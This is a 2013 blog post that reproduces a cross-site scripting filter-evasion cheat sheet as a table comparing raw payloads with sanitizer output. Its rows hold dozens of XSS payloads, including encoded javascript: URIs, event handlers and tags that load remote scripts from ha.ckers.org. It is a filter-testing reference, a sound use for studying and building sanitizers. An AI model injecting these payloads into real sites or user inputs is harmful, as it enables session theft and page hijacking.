title: "常见XSS产生原因"
date: 2013-06-21 13:44:50
tags:
id: 282
comment: false
categories:
  - 编程学习
---

## Test

<table width="50%" style="table-layout:fixed;word-break: break-all; word-wrap: break-word;" cellspacing="0" cellpadding="2">
<thead>
<tr>
<th>Name</th>
<th width="30%">Raw</th>
<th>Output</th>
<th>Render</th>
</tr>
</thead>
<tbody>
<tr>
<td>XSS Locator</td>
<td>
<pre>';alert(String.fromCharCode( »
88,83,83))//\';alert(String. »
fromCharCode(88,83,83))//";a »
lert(String.fromCharCode(88, »
83,83))//\";alert(String.fro »
mCharCode(88,83,83))//--&gt;&lt;/S »
CRIPT&gt;"&gt;'&gt;&lt;SCRIPT&gt;alert(Stri »
ng.fromCharCode(88,83,83))&lt;/ »
SCRIPT&gt;=&amp;{}</pre>
</td>
<td>
<pre>';alert(String.fromCharCode( »
88,83,83))//\';alert(String. »
fromCharCode(88,83,83))//";a »
lert(String.fromCharCode(88, »
83,83))//\";alert(String.fro »
mCharCode(88,83,83))//--&amp;gt; »
"&amp;gt;'&amp;gt;=&amp;amp;{}</pre>
</td>
<td>
<div>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--&gt;"&gt;'&gt;=&amp;{}</div></td>
</tr>
<tr>
<td>XSS Quick Test</td>
<td>
<pre>'';!--"&lt;XSS&gt;=&amp;{()}</pre>
</td>
<td>
<pre>'';!--"=&amp;amp;{()}</pre>
</td>
<td>
<div>'';!--"=&amp;{()}</div></td>
</tr>
<tr>
<td>SCRIPT w/Alert()</td>
<td>
<pre>&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT »
&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>SCRIPT w/Source File</td>
<td>
<pre>&lt;SCRIPT »
SRC=http://ha.ckers.org/xss. »
js&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>SCRIPT w/Char Code</td>
<td>
<pre>&lt;SCRIPT&gt;alert(String.fromCha »
rCode(88,83,83))&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>BASE</td>
<td>
<pre>&lt;BASE »
HREF="javascript:alert('XSS' »
);//"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>BGSOUND</td>
<td>
<pre>&lt;BGSOUND »
SRC="javascript:alert('XSS') »
;"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>BODY background-image</td>
<td>
<pre>&lt;BODY »
BACKGROUND="javascript:alert »
('XSS');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>BODY ONLOAD</td>
<td>
<pre>&lt;BODY ONLOAD=alert('XSS')&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>DIV background-image 1</td>
<td>
<pre>&lt;DIV »
STYLE="background-image: »
url(javascript:alert('XSS')) »
"&gt;</pre>
</td>
<td>
<pre>&lt;div&gt;&lt;/div&gt;</pre>
</td>
<td></td>
</tr>
<tr>
<td>DIV background-image 2</td>
<td>
<pre>&lt;DIV »
STYLE="background-image: »
url(&amp;#1;javascript:alert('XS »
S'))"&gt;</pre>
</td>
<td>
<pre>&lt;div&gt;&lt;/div&gt;</pre>
</td>
<td></td>
</tr>
<tr>
<td>DIV expression</td>
<td>
<pre>&lt;DIV STYLE="width: »
expression(alert('XSS'));"&gt;</pre>
</td>
<td>
<pre>&lt;div&gt;&lt;/div&gt;</pre>
</td>
<td></td>
</tr>
<tr>
<td>FRAME</td>
<td>
<pre>&lt;FRAMESET&gt;&lt;FRAME »
SRC="javascript:alert('XSS') »
;"&gt;&lt;/FRAMESET&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IFRAME</td>
<td>
<pre>&lt;IFRAME »
SRC="javascript:alert('XSS') »
;"&gt;&lt;/IFRAME&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>INPUT Image</td>
<td>
<pre>&lt;INPUT TYPE="IMAGE" »
SRC="javascript:alert('XSS') »
;"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IMG w/JavaScript Directive</td>
<td>
<pre>&lt;IMG »
SRC="javascript:alert('XSS') »
;"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IMG No Quotes/Semicolon</td>
<td>
<pre>&lt;IMG »
SRC=javascript:alert('XSS')&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IMG Dynsrc</td>
<td>
<pre>&lt;IMG »
DYNSRC="javascript:alert('XS »
S');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IMG Lowsrc</td>
<td>
<pre>&lt;IMG »
LOWSRC="javascript:alert('XS »
S');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IMG Embedded commands 1</td>
<td>
<pre>&lt;IMG »
SRC="http://www.thesiteyouar »
eon.com/somecommand.php?some »
variables=maliciouscode"&gt;</pre>
</td>
<td>
<pre>&lt;img »
src="http://www.thesiteyouar »
eon.com/somecommand.php?some »
variables=maliciouscode" »
alt="somecommand.php?somevar »
iables=maliciousc" /&gt;</pre>
</td>
<td>
<div>![somecommand.php?somevariables=maliciousc](http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode)</div></td>
</tr>
<tr>
<td>IMG STYLE w/expression</td>
<td>
<pre>exp/*&lt;XSS »
STYLE='no\xss:noxss("*//*"); »

xss:&amp;#101;x&amp;#x2F;*XSS*//*/* »
/pression(alert("XSS"))'&gt;</pre>
</td>
<td>
<pre>exp/*</pre>
</td>
<td>
<div>exp/*</div></td>
</tr>
<tr>
<td>List-style-image</td>
<td>
<pre>&lt;STYLE&gt;li {list-style-image: »
url("javascript:alert('XSS') »
");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS</pre>
</td>
<td>
<pre>&lt;ul&gt;&lt;li&gt;XSS&lt;/li&gt;&lt;/ul&gt;</pre>
</td>
<td>
<div>

*   XSS
</div></td>
</tr>
<tr>
<td>IMG w/VBscript</td>
<td>
<pre>&lt;IMG »
SRC='vbscript:msgbox("XSS")' »
&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>LAYER</td>
<td>
<pre>&lt;LAYER »
SRC="http://ha.ckers.org/scr »
iptlet.html"&gt;&lt;/LAYER&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Livescript</td>
<td>
<pre>&lt;IMG »
SRC="livescript:[code]"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>US-ASCII encoding</td>
<td>
<pre>scriptalert(XSS)/script »</pre>
</td>
<td>
<pre>scriptalert(XSS)/script</pre>
</td>
<td>
<div>scriptalert(XSS)/script</div></td>
</tr>
<tr>
<td>META</td>
<td>
<pre>&lt;META HTTP-EQUIV="refresh" »
CONTENT="0;url=javascript:al »
ert('XSS');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>META w/data:URL</td>
<td>
<pre>&lt;META HTTP-EQUIV="refresh" »
CONTENT="0;url=data:text/htm »
l;base64,PHNjcmlwdD5hbGVydCg »
nWFNTJyk8L3NjcmlwdD4K"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>META w/additional URL parameter</td>
<td>
<pre>&lt;META HTTP-EQUIV="refresh" »
CONTENT="0; »
URL=http://;URL=javascript:a »
lert('XSS');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Mocha</td>
<td>
<pre>&lt;IMG SRC="mocha:[code]"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>OBJECT</td>
<td>
<pre>&lt;OBJECT »
TYPE="text/x-scriptlet" »
DATA="http://ha.ckers.org/sc »
riptlet.html"&gt;&lt;/OBJECT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>OBJECT w/Embedded XSS</td>
<td>
<pre>&lt;OBJECT »
classid=clsid:ae24fdae-03c6- »
11d1-8b76-0080c744f389&gt;&lt;para »
m name=url »
value=javascript:alert('XSS' »
)&gt;&lt;/OBJECT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Embed Flash</td>
<td>
<pre>&lt;EMBED »
SRC="http://ha.ckers.org/xss »
.swf" »
AllowScriptAccess="always"&gt;&lt; »
/EMBED&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>STYLE</td>
<td>
<pre>&lt;STYLE »
TYPE="text/javascript"&gt;alert »
('XSS');&lt;/STYLE&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>STYLE w/Comment</td>
<td>
<pre>&lt;IMG »
STYLE="xss:expr/*XSS*/ession »
(alert('XSS'))"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>STYLE w/Anonymous HTML</td>
<td>
<pre>&lt;XSS »
STYLE="xss:expression(alert( »
'XSS'))"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>STYLE w/background-image</td>
<td>
<pre>&lt;STYLE&gt;.XSS{background-image »
:url("javascript:alert('XSS' »
)");}&lt;/STYLE&gt;&lt;A »
CLASS=XSS&gt;&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a&gt;&lt;/a&gt;</pre>
</td>
<td></td>
</tr>
<tr>
<td>STYLE w/background</td>
<td>
<pre>&lt;STYLE »
type="text/css"&gt;BODY{backgro »
und:url("javascript:alert('X »
SS')")}&lt;/STYLE&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Stylesheet</td>
<td>
<pre>&lt;LINK REL="stylesheet" »
HREF="javascript:alert('XSS' »
);"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Remote Stylesheet 1</td>
<td>
<pre>&lt;LINK REL="stylesheet" »
HREF="http://ha.ckers.org/xs »
s.css"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Remote Stylesheet 2</td>
<td>
<pre>&lt;STYLE&gt;@import'http://ha.cke »
rs.org/xss.css';&lt;/STYLE&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Remote Stylesheet 3</td>
<td>
<pre>&lt;META HTTP-EQUIV="Link" »
Content="&lt;http://ha.ckers.or »
g/xss.css&gt;; REL=stylesheet"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Remote Stylesheet 4</td>
<td>
<pre>&lt;STYLE&gt;BODY{-moz-binding:url »
("http://ha.ckers.org/xssmoz »
.xml#xss")}&lt;/STYLE&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>TABLE</td>
<td>
<pre>&lt;TABLE »
BACKGROUND="javascript:alert »
('XSS')"&gt;&lt;/TABLE&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>TD</td>
<td>
<pre>&lt;TABLE&gt;&lt;TD »
BACKGROUND="javascript:alert »
('XSS')"&gt;&lt;/TD&gt;&lt;/TABLE&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>XML namespace</td>
<td>
<pre>&lt;HTML xmlns:xss&gt;
&lt;?import »
namespace="xss" »
implementation="http://ha.ck »
ers.org/xss.htc"&gt;
&lt;xss:xss&gt;X »
SS&lt;/xss:xss&gt;

&lt;/HTML&gt;</pre>
</td>
<td>
<pre>&amp;lt;?import namespace="xss" »
implementation="http://ha.ck »
ers.org/xss.htc"&amp;gt;
XSS</pre>
</td>
<td>
<div>&lt;?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"&gt; XSS</div></td>
</tr>
<tr>
<td>XML data island w/CDATA</td>
<td>
<pre>&lt;XML »
ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG »
SRC="javas]]&gt;&lt;![CDATA[cript: »
alert('XSS');"&gt;]]&gt;

&lt;/C&gt;&lt;/X&gt; »
&lt;/xml&gt;&lt;SPAN DATASRC=#I »
DATAFLD=C DATAFORMATAS=HTML&gt;</pre>
</td>
<td>
<pre>&amp;lt;IMG »
SRC="javascript:alert('XSS') »
;"&amp;gt;

&lt;span&gt;&lt;/span&gt;</pre>
</td>
<td>
<div>&lt;IMG SRC="javascript:alert('XSS');"&gt;</div></td>
</tr>
<tr>
<td>XML data island w/comment</td>
<td>
<pre>&lt;XML ID="xss"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG »
SRC="javas&lt;!-- »
--&gt;cript:alert('XSS')"&gt;&lt;/B&gt;&lt; »
/I&gt;&lt;/XML&gt;

&lt;SPAN »
DATASRC="#xss" DATAFLD="B" »
DATAFORMATAS="HTML"&gt;&lt;/SPAN&gt;</pre>
</td>
<td>
<pre>&lt;i&gt;&lt;b&gt;&lt;img src="javas" »
alt="javas&amp;lt;!-- »
--&amp;gt;cript:alert('XSS')" »
/&gt;&lt;/b&gt;&lt;/i&gt;&lt;span&gt;&lt;/span&gt;</pre>
</td>
<td>
<div>_**![javas&lt;!-- --&gt;cript:alert(](http://htmlpurifier.org/live/smoketests/javas)**_</div></td>
</tr>
<tr>
<td>XML (locally hosted)</td>
<td>
<pre>&lt;XML »
SRC="http://ha.ckers.org/xss »
test.xml" ID=I&gt;&lt;/XML&gt;
&lt;SPAN »
DATASRC=#I DATAFLD=C »
DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;</pre>
</td>
<td>
<pre>&lt;span&gt;&lt;/span&gt;</pre>
</td>
<td></td>
</tr>
<tr>
<td>XML HTML+TIME</td>
<td>
<pre>&lt;HTML&gt;&lt;BODY&gt;
&lt;?xml:namespace »
prefix="t" »
ns="urn:schemas-microsoft-co »
m:time"&gt;

&lt;?import »
namespace="t" »
implementation="#default#tim »
e2"&gt;
&lt;t:set »
attributeName="innerHTML" »
to="XSS&lt;SCRIPT »
DEFER&gt;alert('XSS')&lt;/SCRIPT&gt;" »
&gt; &lt;/BODY&gt;&lt;/HTML&gt;</pre>
</td>
<td>
<pre>&amp;lt;?xml:namespace »
prefix="t" »
ns="urn:schemas-microsoft-co »
m:time"&amp;gt;

&amp;lt;?import »
namespace="t" »
implementation="#default#tim »
e2"&amp;gt;</pre>
</td>
<td>
<div>&lt;?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"&gt;&lt; ?import namespace="t" implementation="#default#time2"&gt;</div></td>
</tr>
<tr>
<td>Commented-out Block</td>
<td>
<pre>&lt;!--[if gte IE »
4]&gt;
&lt;SCRIPT&gt;alert('XSS');&lt;/S »
CRIPT&gt;
&lt;![endif]--&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Cookie Manipulation</td>
<td>
<pre>&lt;META »
HTTP-EQUIV="Set-Cookie" »
Content="USERID=&lt;SCRIPT&gt;aler »
t('XSS')&lt;/SCRIPT&gt;"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Local .htc file</td>
<td>
<pre>&lt;XSS STYLE="behavior: »
url(http://ha.ckers.org/xss. »
htc);"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Rename .js to .jpg</td>
<td>
<pre>&lt;SCRIPT »
SRC="http://ha.ckers.org/xss »
.jpg"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>SSI</td>
<td>
<pre>&lt;!--#exec cmd="/bin/echo »
'&lt;SCRIPT SRC'"--&gt;&lt;!--#exec »
cmd="/bin/echo »
'=http://ha.ckers.org/xss.js »
&gt;&lt;/SCRIPT&gt;'"--&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>PHP</td>
<td>
<pre>&lt;? »
echo('&lt;SCR)';
echo('IPT&gt;aler »
t("XSS")&lt;/SCRIPT&gt;'); ?&gt;</pre>
</td>
<td>
<pre>&amp;lt;? echo('alert("XSS")'); »
?&amp;gt;</pre>
</td>
<td>
<div>&lt;? echo('alert("XSS")'); ?&gt;</div></td>
</tr>
<tr>
<td>JavaScript Includes</td>
<td>
<pre>&lt;BR SIZE="&amp;{alert('XSS')}"&gt;</pre>
</td>
<td>
<pre>&lt;br /&gt;</pre>
</td>
<td></td>
</tr>
<tr>
<td>Character Encoding Example</td>
<td>
<pre>&lt;
%3C
&amp;lt
&amp;lt;
&amp;LT
&amp;LT;
&amp;#60 »

&amp;#060
&amp;#0060

&amp;#00060
&amp;#000 »
060
&amp;#0000060
&amp;#60;
&amp;#060;
&amp; »
#0060;
&amp;#00060;
&amp;#000060;
&amp;# »
0000060;
&amp;#x3c
&amp;#x03c
&amp;#x003 »
c
&amp;#x0003c
&amp;#x00003c
&amp;#x0000 »
03c
&amp;#x3c;
&amp;#x03c;

&amp;#x003c; »

&amp;#x0003c;
&amp;#x00003c;
&amp;#x000 »
003c;
&amp;#X3c
&amp;#X03c
&amp;#X003c
&amp; »
#X0003c
&amp;#X00003c
&amp;#X000003c »

&amp;#X3c;
&amp;#X03c;
&amp;#X003c;
&amp;#X »
0003c;
&amp;#X00003c;
&amp;#X000003c »
;
&amp;#x3C

&amp;#x03C
&amp;#x003C
&amp;#x0 »
003C
&amp;#x00003C
&amp;#x000003C
&amp;# »
x3C;
&amp;#x03C;
&amp;#x003C;
&amp;#x000 »
3C;
&amp;#x00003C;
&amp;#x000003C;
&amp; »
#X3C
&amp;#X03C
&amp;#X003C
&amp;#X0003C »

&amp;#X00003C
&amp;#X000003C

&amp;#X3C »
;
&amp;#X03C;
&amp;#X003C;
&amp;#X0003C; »

&amp;#X00003C;
&amp;#X000003C;
\x3c »

\x3C
\u003c
\u003C</pre>
</td>
<td>
<pre>&amp;lt;
%3C
&amp;amp;lt
&amp;lt;
&amp;amp;L »
T
&amp;amp;LT;
&amp;lt;
&amp;lt;
&amp;lt;

&amp; »
lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt; »

&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;l »
t;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
 »

&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;l »
t;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
 »
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt »
;

&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
 »
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt »
;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp; »
lt;

&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt;
&amp;lt »
;
&amp;lt;
\x3c
\x3C
\u003c
\u00 »
3C</pre>
</td>
<td>
<div>&lt;%3C&amp; lt&lt;&amp; LT&amp; LT;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; \x3c \x3C \u003c \u003C</div></td>
</tr>
<tr>
<td>Case Insensitive</td>
<td>
<pre>&lt;IMG »
SRC=JaVaScRiPt:alert('XSS')&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>HTML Entities</td>
<td>
<pre>&lt;IMG »
SRC=javascript:alert(&amp;quot;X »
SS&amp;quot;)&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Grave Accents</td>
<td>
<pre>&lt;IMG »
SRC=`javascript:alert("RSnak »
e says, 'XSS'")`&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Image w/CharCode</td>
<td>
<pre>&lt;IMG »
SRC=javascript:alert(String. »
fromCharCode(88,83,83))&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>UTF-8 Unicode Encoding</td>
<td>
<pre>&lt;IMG »
SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;# »
115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp; »
#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp; »
#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;# »
83;&amp;#83;&amp;#39;&amp;#41;&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Long UTF-8 Unicode w/out Semicolons</td>
<td>
<pre>&lt;IMG »
SRC=&amp;#0000106&amp;#0000097&amp;#0000 »
118&amp;#0000097&amp;#0000115&amp;#00000 »
99&amp;#0000114&amp;#0000105&amp;#000011 »
2&amp;#0000116&amp;#0000058&amp;#0000097 »
&amp;#0000108&amp;#0000101&amp;#0000114&amp; »
#0000116&amp;#0000040&amp;#0000039&amp;# »
0000088&amp;#0000083&amp;#0000083&amp;#0 »
000039&amp;#0000041&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>DIV w/Unicode</td>
<td>
<pre>&lt;DIV »
STYLE="background-image:\007 »
5\0072\006C\0028'\006a\0061\ »
0076\0061\0073\0063\0072\006 »
9\0070\0074\003a\0061\006c\0 »
065\0072\0074\0028.1027\0058 »
.1053\0053\0027\0029'\0029"&gt;</pre>
</td>
<td>
<pre>&lt;div&gt;&lt;/div&gt;</pre>
</td>
<td></td>
</tr>
<tr>
<td>Hex Encoding w/out Semicolons</td>
<td>
<pre>&lt;IMG »
SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x7 »
3&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;# »
x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74 »
&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x »
27&amp;#x29&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>UTF-7 Encoding</td>
<td>
<pre>&lt;HEAD&gt;&lt;META »
HTTP-EQUIV="CONTENT-TYPE" »
CONTENT="text/html; »
charset=UTF-7"&gt; »
&lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert »
('XSS');+ADw-/SCRIPT+AD4-</pre>
</td>
<td>
<pre>+ADw-SCRIPT+AD4-alert('XSS') »
;+ADw-/SCRIPT+AD4-</pre>
</td>
<td>
<div>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-</div></td>
</tr>
<tr>
<td>Escaping JavaScript escapes</td>
<td>
<pre>\";alert('XSS');//</pre>
</td>
<td>
<pre>\";alert('XSS');//</pre>
</td>
<td>
<div>\";alert('XSS');//</div></td>
</tr>
<tr>
<td>End title tag</td>
<td>
<pre>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS") »
;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>STYLE w/broken up JavaScript</td>
<td>
<pre>&lt;STYLE&gt;@im\port'\ja\vasc\rip »
t:alert("XSS")';&lt;/STYLE&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Embedded Tab</td>
<td>
<pre>&lt;IMG »
SRC="jav**\t**ascript:alert('XSS' »
);"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Embedded Encoded Tab</td>
<td>
<pre>&lt;IMG »
SRC="jav&amp;#x09;ascript:alert( »
'XSS');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Embedded Newline</td>
<td>
<pre>&lt;IMG »
SRC="jav&amp;#x0A;ascript:alert( »
'XSS');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Embedded Carriage Return</td>
<td>
<pre>&lt;IMG »
SRC="jav&amp;#x0D;ascript:alert( »
'XSS');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Multiline w/Carriage Returns</td>
<td>
<pre>&lt;IMG
SRC
=
"
j
a
v
a
s
c
r
i »

p
t
:
a
l
e
r
t
(
'
X
S
S
' »

)
"
&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Null Chars 1</td>
<td>
<pre>&lt;IMG »
SRC=java**\0**script:alert("XSS") »
&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Null Chars 2</td>
<td>
<pre>&amp;&lt;SCR**\0**IPT&gt;alert("XSS")&lt;/SCR**\0** »
IPT&gt;</pre>
</td>
<td>
<pre>&amp;amp;</pre>
</td>
<td>
<div>&amp;</div></td>
</tr>
<tr>
<td>Spaces/Meta Chars</td>
<td>
<pre>&lt;IMG SRC=" &amp;#14;  »
javascript:alert('XSS');"&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Non-Alpha/Non-Digit</td>
<td>
<pre>&lt;SCRIPT/XSS »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Non-Alpha/Non-Digit Part 2</td>
<td>
<pre>&lt;BODY »
onload!#$%&amp;()*~+-_.,:;?@[/|\ »
]^`=alert("XSS")&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>No Closing Script Tag</td>
<td>
<pre>&lt;SCRIPT »
SRC=http://ha.ckers.org/xss. »
js</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Protocol resolution in script tags</td>
<td>
<pre>&lt;SCRIPT »
SRC=//ha.ckers.org/.j&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Half-Open HTML/JavaScript</td>
<td>
<pre>&lt;IMG »
SRC="javascript:alert('XSS') »
"</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Double open angle brackets</td>
<td>
<pre>&lt;IFRAME »
SRC=http://ha.ckers.org/scri »
ptlet.html &lt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Extraneous Open Brackets</td>
<td>
<pre>&lt;&lt;SCRIPT&gt;alert("XSS");//&lt;&lt;/S »
CRIPT&gt;</pre>
</td>
<td>
<pre>&amp;lt;</pre>
</td>
<td>
<div>&lt;</div></td>
</tr>
<tr>
<td>Malformed IMG Tags</td>
<td>
<pre>&lt;IMG »
"""&gt;&lt;SCRIPT&gt;alert("XSS")&lt;/SC »
RIPT&gt;"&gt;</pre>
</td>
<td>
<pre>"&amp;gt;</pre>
</td>
<td>
<div>"&gt;</div></td>
</tr>
<tr>
<td>No Quotes/Semicolons</td>
<td>
<pre>&lt;SCRIPT&gt;a=/XSS/
alert(a.sour »
ce)&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Evade Regex Filter 1</td>
<td>
<pre>&lt;SCRIPT a="&gt;" »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Evade Regex Filter 2</td>
<td>
<pre>&lt;SCRIPT ="blah" »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Evade Regex Filter 3</td>
<td>
<pre>&lt;SCRIPT a="blah" '' »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Evade Regex Filter 4</td>
<td>
<pre>&lt;SCRIPT "a='&gt;'" »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Evade Regex Filter 5</td>
<td>
<pre>&lt;SCRIPT a=`&gt;` »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Filter Evasion 1</td>
<td>
<pre>&lt;SCRIPT&gt;document.write("&lt;SCR »
I");&lt;/SCRIPT&gt;PT »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td>
<pre>PT »
SRC="http://ha.ckers.org/xss »
.js"&amp;gt;</pre>
</td>
<td>
<div>PT SRC="http://ha.ckers.org/xss.js"&gt;</div></td>
</tr>
<tr>
<td>Filter Evasion 2</td>
<td>
<pre>&lt;SCRIPT a="&gt;'&gt;" »
SRC="http://ha.ckers.org/xss »
.js"&gt;&lt;/SCRIPT&gt;</pre>
</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IP Encoding</td>
<td>
<pre>&lt;A »
HREF="http://66.102.7.147/"&gt; »
XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a »
href="http://66.102.7.147/"&gt; »
XSS&lt;/a&gt;</pre>
</td>
<td>
<div>[XSS](http://66.102.7.147/)</div></td>
</tr>
<tr>
<td>URL Encoding</td>
<td>
<pre>&lt;A »
HREF="http://%77%77%77%2E%67 »
%6F%6F%67%6C%65%2E%63%6F%6D" »
&gt;XSS&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
<div><a>XSS</a></div></td>
</tr>
<tr>
<td>Dword Encoding</td>
<td>
<pre>&lt;A »
HREF="http://1113982867/"&gt;XS »
S&lt;/A&gt;</pre>
</td>
<td>
<pre>&lt;a href="/"&gt;XSS&lt;/a&gt;</pre>
</td>
<td>
